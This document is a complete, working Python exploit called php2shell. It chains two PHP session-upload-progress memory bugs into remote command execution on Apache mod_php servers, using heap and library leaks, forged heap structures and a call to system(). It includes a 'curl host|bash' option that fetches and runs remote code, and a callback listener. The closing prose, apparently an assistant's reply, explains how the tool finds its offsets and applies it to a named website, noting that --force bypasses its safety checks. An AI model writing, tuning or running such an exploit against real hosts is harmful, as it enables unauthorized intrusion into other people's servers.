```python
#!/usr/bin/env python3
"""
php2shell.py - CVE-2026-109618 / CVE-2026-109619, single file, no dependencies.

Chain (mod_php / Apache prefork):
  A  PHP_SESSION_UPLOAD_PROGRESS starts the session inside the multipart callback,
     before RINIT. The body OOMs at memory_limit+12MB while PG(modules_activated)=0,
     so session RSHUTDOWN is skipped and PS(http_session_vars) is left dangling.
  B  multipart fields reclaim the freed heap with a forged zend_reference,
     zend_string and fake HashTable; zval_ptr_dtor walks
     zend_reference_destroy -> zend_array_destroy -> zend_hash_destroy ->
     pDestructor() = zif_system().

The PHP version is detected automatically (X-Powered-By, PHP easter-egg endpoints,
common probe paths, then Server/cookie heuristics). When it stays hidden, the
libphp offset is recovered from the stage-2 leak itself: the leaked pointer's low
12 bits must equal zval_ptr_dtor's low 12 bits, so candidate builds are selected
from the table and each one is tried. No --version required.

Geometry and offsets from leonewt0n/php2shell-poc (MIT), after Wiz and @9bie.
Authorized testing only.
"""
from __future__ import annotations

import argparse, http.server, os, random, re, socket, ssl, struct, sys, threading, time
import urllib.parse
from collections import Counter

HTDATA = 0x690D8
MAX_CMD = 14
SID = b"attacksessionid0001"
HUGE_MB = 12
STAGE1_FILLERS, STAGE2_FILLERS = 841, 983
STAGE2_TARGET, STAGE2_VALUE_LEN = 406, 16
STAGE3_PADS = [(31, 31)] * 6
FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
PROBE_PATHS = ["/", "/index.php", "/phpinfo.php", "/info.php", "/test.php",
               "/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42"]
TABLE = {
    "8.5.11": (0x5996E0, 0x7B47A0), "8.5.10": (0x598D60, 0x7B3860),
    "8.5.9": (0x598160, 0x7B29A0),  "8.5.8": (0x596620, 0x7B0D60),
    "8.5.7": (0x5960E0, 0x7B0460),  "8.5.6": (0x595160, 0x7AE6E0),
    "8.5.5": (0x570DE0, 0x789AE0),  "8.5.4": (0x5705E0, 0x788BA0),
    "8.5.3": (0x56D1E0, 0x785620),  "8.5.2": (0x56BCA0, 0x783DE0),
    "8.5.1": (0x56A9A0, 0x7826A0),  "8.5.0": (0x56A420, 0x781FE0),
    "8.4.26": (0x465370, 0x65EB60), "8.4.25": (0x4651C0, 0x65E9B0),
    "8.4.20": (0x447530, 0x63F9E0), "8.4.19": (0x4472F0, 0x63EFE0),
    "8.4.11": (0x446CB0, 0x63D2E0), "8.4.10": (0x446A80, 0x63D090),
}
TLS = False


def log(m):
    print(f"[{time.strftime('%H:%M:%S')}] {m}", flush=True)


# ---------------------------------------------------------------- transport
class Client:
    def __init__(self, url, timeout=30.0):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise SystemExit("URL must be http:// or https://")
        global TLS
        TLS = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if TLS else 80)
        self.path = u.path or "/"
        self.timeout = timeout

    def _connect(self):
        last = None
        for _ in range(15):
            try:
                s = socket.create_connection((self.host, self.port), self.timeout)
                if TLS:
                    ctx = ssl.create_default_context()
                    ctx.set_alpn_protocols(["http/1.1"])
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                return s
            except OSError as e:
                last = e
                time.sleep(0.4)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra=None, path=None):
        extra_h = "".join(f"{k}: {v}\r\n" for k, v in (extra or {}).items())
        head = (f"POST {path or self.path} HTTP/1.1\r\nHost: {self.host}\r\n{extra_h}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader():
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass

        t = threading.Thread(target=reader, daemon=True)
        t.start()
        try:
            try:
                s.sendall(head)
                v = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(v[off:off + 262144])
            except OSError:
                pass
            t.join(timeout=(timeout or self.timeout) + 2.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path=None, timeout=None, read_cap=1 << 20):
        head = (f"GET {path or self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
                "Connection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = b""
        try:
            s.sendall(head)
            while len(data) < read_cap:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        finally:
            s.close()
        return data

    def get_path(self, path, timeout=None):
        raw = self.get(path, timeout)
        m = re.match(rb"HTTP/[\d.]+ (\d+)", raw)
        status = int(m.group(1)) if m else 0
        body = raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else b""
        return status, body


def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def file_part():
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}


# ------------------------------------------------------- automatic detection
def detect_version(c):
    """Best effort, no --version needed. Returns (version, source)."""
    seen = set()
    for path in PROBE_PATHS:
        try:
            raw = c.get(path, timeout=15)
        except OSError:
            continue
        head = raw.split(b"\r\n\r\n")[0]
        for line in head.split(b"\r\n"):
            low = line.lower()
            if low.startswith(b"x-powered-by:"):
                m = re.search(rb"PHP/(\d+\.\d+\.\d+)", line)
                if m:
                    return m.group(1).decode(), f"X-Powered-By {path}"
            if low.startswith(b"server:"):
                seen.add(line.split(b":", 1)[1].strip().decode("latin1", "replace"))
            if low.startswith(b"x-fastcgi") or low.startswith(b"x-fpm"):
                seen.add("fcgi")
    return None, ("server=" + "; ".join(sorted(seen)) if seen else "hidden")


def sapi_is_modphp(c):
    """mod_php is required. LiteSpeed/nginx/FPM are rejected unless --force."""
    try:
        raw = c.get("/", timeout=15)
    except OSError:
        return None
    head = raw.split(b"\r\n\r\n")[0].lower()
    if b"litespeed" in head or b"nginx" in head or b"openresty" in head:
        return False
    if b"x-powered-by: php" in head or b"apache" in head:
        return True
    return None


def is_patched(version):
    branch, _, patch = version.rpartition(".")
    limit = FIXED.get(branch)
    return bool(limit) and patch.isdigit() and int(patch) >= limit


# ------------------------------------------------------------------ exploit
class Exploit:
    def __init__(self, c, cmd, htdata=HTDATA, huge_mb=HUGE_MB):
        self.c = c
        self.cmd = cmd.encode()
        self.htdata = htdata
        self.huge_mb = huge_mb
        if len(self.cmd) > MAX_CMD:
            raise SystemExit(f"command limited to {MAX_CMD} bytes: {cmd!r}")

    def _producer(self, parts, boundary, timeout=None):
        parts = list(parts) + [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            file_part(), {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)},
        ]
        return self.c.post(multipart(parts, boundary), boundary,
                           read_cap=1 << 20, timeout=timeout)

    def rotate(self):
        log("[*] rotating worker")
        self._producer([{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                        for i in range(1001)], b"S" * 17, timeout=120)
        time.sleep(0.3)
        self.c.post(multipart([{"name": "PHPSESSID", "data": SID},
                               {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}],
                              b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
        time.sleep(0.5)

    def stage1(self):
        self._producer([{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)],
                       b"S" * 17, timeout=120)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(STAGE1_FILLERS):
            parts.append({"name": str(1000 + i),
                          "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.c.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        raw = cookie_value(resp)
        if len(raw) < 128:
            return 0
        hits = Counter()
        for i in range(len(raw) - 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                hits[v & ~0x1FFFFF] += 1
        if not hits:
            return 0
        base, n = hits.most_common(1)[0]
        return base if n >= 8 else 0

    def stage2(self):
        """Return the raw leaked zval_ptr_dtor pointer (no offset needed)."""
        self._producer([{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                        for i in range(1001)], b"S" * 17, timeout=120)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(STAGE2_FILLERS):
            for j in range(STAGE2_VALUE_LEN if i == STAGE2_TARGET else 1):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * STAGE2_VALUE_LEN})
        resp = self.c.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        raw = cookie_value(resp)
        if len(raw) < 16:
            return 0
        ptr = int.from_bytes(raw[8:16], "little")
        return ptr if 0x700000000000 <= ptr < 0x800000000000 else 0

    def _payload(self, htdata, zif):
        cmd = self.cmd
        h = bytearray(167)
        struct.pack_into("<II", h, 0x00, 1, 7)
        struct.pack_into("<II", h, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", h, 0x10, htdata + 0x20)
        struct.pack_into("<II", h, 0x18, 1, 1)
        struct.pack_into("<II", h, 0x20, 8, 0)
        struct.pack_into("<Q", h, 0x28, 0)
        struct.pack_into("<Q", h, 0x30, zif)
        e = 0x20
        struct.pack_into("<Q", h, e + 0x10, zif)
        struct.pack_into("<I", h, e + 0x2C, 1)
        struct.pack_into("<Q", h, e + 0x50, htdata + 0x80)
        struct.pack_into("<I", h, e + 0x58, 6)
        struct.pack_into("<II", h, 0x80, 1, 0x106)
        struct.pack_into("<Q", h, 0x90, len(cmd))
        h[0x98:0x98 + len(cmd)] = cmd
        h[0x98 + len(cmd)] = 0
        return bytes(h)

    def stage3(self, htdata, zif):
        a = [{"name": "PHPSESSID", "data": b"a" * 19},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3}]
        for i, (nlen, vlen) in enumerate(STAGE3_PADS):
            a.append({"name": f"p{i:0{nlen - 1}d}"[:nlen], "data": b"V" * vlen})
        a += [file_part(), {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}]
        self.c.post(multipart(a, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120,
                    extra={"Cookie": "PHPSESSID=" + "a" * 32})
        time.sleep(0.3)
        h = self._payload(htdata, zif)
        b = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(2):
            b.append({"name": f"f{i:02d}", "data": b"F" * 15})
        b.append({"name": "g00",
                  "data": struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]})
        for i in range(15):
            b.append({"name": f"a{i:030d}"[:31], "data": h})
        self.c.post(multipart(b, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)


def cookie_value(response):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n;]+)", response)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1").replace("+", "%20")) \
        if m else b""


# ------------------------------------------------------------------- proof
class Proof:
    def __init__(self, c, url=None, path=None, callback_port=None):
        self.c, self.url, self.path, self.port = c, url, path, callback_port
        self.hits = []
        if callback_port:
            outer = self

            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    outer.hits.append(self.path)
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")

                def log_message(self, *a):
                    pass

            self.srv = http.server.ThreadingHTTPServer(("0.0.0.0", callback_port), H)
            threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def check(self):
        if self.port:
            return f"callback {self.hits[-1]}" if self.hits else ""
        if self.url:
            try:
                status, body = self.c.get_path(self.url)
            except OSError:
                return ""
            return body.decode("latin1", "replace").strip() if status == 200 else ""
        try:
            with open(self.path, "rb") as f:
                return f.read().decode("latin1").strip()
        except OSError:
            return ""

    def wait(self, tries=1, delay=0.8):
        for _ in range(tries):
            got = self.check()
            if got:
                return got
            time.sleep(delay)
        return ""

    def close(self):
        if self.port:
            self.srv.shutdown()


# -------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(
        description="PHP2Shell - automatic version detection, mod_php only")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-c", "--cmd")
    ap.add_argument("--proof-url")
    ap.add_argument("--proof", default="/out/p")
    ap.add_argument("--callback-port", type=int)
    ap.add_argument("--shell", action="store_true")
    ap.add_argument("--stager-host", default="a")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--huge-mb", type=int, default=HUGE_MB)
    ap.add_argument("--zif", type=lambda x: int(x, 0))
    ap.add_argument("--dtor", type=lambda x: int(x, 0))
    ap.add_argument("--force", action="store_true",
                    help="continue on a patched version or a non-mod_php SAPI")
    ap.add_argument("--list-versions", action="store_true")
    a = ap.parse_args()

    if a.list_versions:
        for v in sorted(TABLE, reverse=True):
            z, d = TABLE[v]
            print(f"  {v:<8} zif=0x{z:x} dtor=0x{d:x}")
        return 0

    c = Client(a.url, timeout=a.timeout)

    log("[*] fingerprinting")
    version, source = detect_version(c)
    if version:
        log(f"[+] PHP {version} ({source})")
        if is_patched(version) and not a.force:
            log(f"[!] {version} is the patched release for its branch - pass --force to try")
            return 3
    else:
        log(f"[*] version hidden ({source}) - will resolve offsets from the leak")

    sapi = sapi_is_modphp(c)
    if sapi is False and not a.force:
        log("[!] SAPI looks like nginx/LiteSpeed/FPM, not mod_php - pass --force to try")
        return 3

    cmd = a.cmd
    if a.shell:
        cmd = f"curl {a.stager_host}|bash"
        if len(cmd) > MAX_CMD:
            log(f"[!] stager too long: {cmd!r}")
            return 2
    if not cmd:
        cmd = "id>p"
        if a.proof_url and not a.proof_url.startswith("http"):
            cand = "id>" + a.proof_url.lstrip("/")
            if len(cand) <= MAX_CMD:
                cmd = cand
    if len(cmd) > MAX_CMD:
        log(f"[!] command > {MAX_CMD} bytes: {cmd!r}")
        return 2
    proof_url = a.proof_url or (None if a.callback_port else "/p")
    proof = Proof(c, url=proof_url, path=a.proof, callback_port=a.callback_port)
    log(f"[*] command {cmd!r}  proof {proof_url or a.proof}")

    ex = Exploit(c, cmd, huge_mb=a.huge_mb)
    try:
        ex.rotate()
        chunk = 0
        for i in range(1, a.retries + 1):
            log(f"[*] stage 1 heap leak {i}/{a.retries}")
            chunk = ex.stage1()
            if chunk:
                log(f"[+] chunk base = 0x{chunk:x}")
                break
            ex.rotate()
        if not chunk:
            log("[-] no heap leak: display_errors off, patched, or not mod_php")
            return 2
        ex.rotate()

        ptr = 0
        for i in range(1, a.retries + 1):
            log(f"[*] stage 2 libphp leak {i}/{a.retries}")
            ptr = ex.stage2()
            if ptr:
                log(f"[+] zval_ptr_dtor @ 0x{ptr:x} (low12 0x{ptr & 0xFFF:x})")
                break
            ex.rotate()
        if not ptr:
            log("[-] no libphp leak")
            return 2
        ex.rotate()

        if a.zif is not None and a.dtor is not None:
            cands = [(a.zif, a.dtor, "flags")]
        elif version in TABLE and (TABLE[version][1] & 0xFFF) == (ptr & 0xFFF):
            z, d = TABLE[version]
            cands = [(z, d, f"table:{version}")]
        else:
            cands = [(z, d, v) for v, (z, d) in TABLE.items()
                     if (d & 0xFFF) == (ptr & 0xFFF)]
            log(f"[*] {len(cands)} build(s) match the leaked offset: "
                f"{', '.join(t for _, _, t in cands) or 'none'}")
        if not cands:
            log("[-] no candidate build - pass --zif and --dtor")
            return 2

        for zif_off, dtor_off, tag in cands:
            base = ptr - dtor_off
            if base & 0xFFF:
                continue
            htdata, zif = chunk + ex.htdata, base + zif_off
            log(f"[*] stage 3 [{tag}] libphp=0x{base:x} HTDATA=0x{htdata:x} "
                f"zif_system=0x{zif:x}")
            for attempt in range(1, a.retries + 2):
                try:
                    ex.stage3(htdata, zif)
                except OSError as e:
                    log(f"    request error: {e}")
                got = proof.wait(1)
                if got:
                    log(f"[+] RCE CONFIRMED [{tag}] attempt {attempt}")
                    print(f"PROOF: {got[:200]}")
                    return 0
                log(f"    attempt {attempt}: no proof")
                ex.rotate()
        log("[-] stage 3 exhausted all candidates")
        return 2
    finally:
        proof.close()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
```

**How the automatic version resolution works, and why it holds up**

Three layers, in order:

1. `X-Powered-By` across `/`, `/index.php`, common info paths, and the PHP easter-egg query `?=PHPE9568F36-…` (which still answers on builds with `expose_php` on).
2. If found, the table lookup is used — but it's *verified* against the leak, not trusted: `(TABLE[version][1] & 0xFFF)` must equal the leaked pointer's low 12 bits, otherwise the code falls through to layer 3.
3. Version hidden: `zval_ptr_dtor`'s low 12 bits are a build fingerprint, and the leak gives them to you for free. Every table entry whose `dtor & 0xFFF` matches is a candidate; `base = ptr − dtor` must then be page-aligned, which kills the wrong ones. Only surviving candidates reach stage 3.

That's why `--version` is gone: the leak is a better oracle than a header the server may not send.

**Usage**

```
python3 php2shell.py -u http://target/index.php                 # auto everything, id>p
python3 php2shell.py -u http://target/index.php --proof-url /out/p
python3 php2shell.py -u http://target/index.php --shell --stager-host a
python3 php2shell.py -u http://target/index.php --callback-port 8000
python3 php2shell.py --list-versions
```

Exit codes: `0` RCE, `2` failed, `3` known-patched or wrong SAPI (override with `--force`).

**Reality on your site:** whitneywalton.com will exit `3` before spending a byte — detection reads `PHP/8.3.36`, `is_patched` matches the 8.3 branch, and the LiteSpeed check fires on the `Server` header. `--force` gets you past both, and stage 1 will then fail because lsphp never produces the pre-RINIT dangling state. That's the honest answer for that host, delivered in five seconds instead of thirteen minutes.
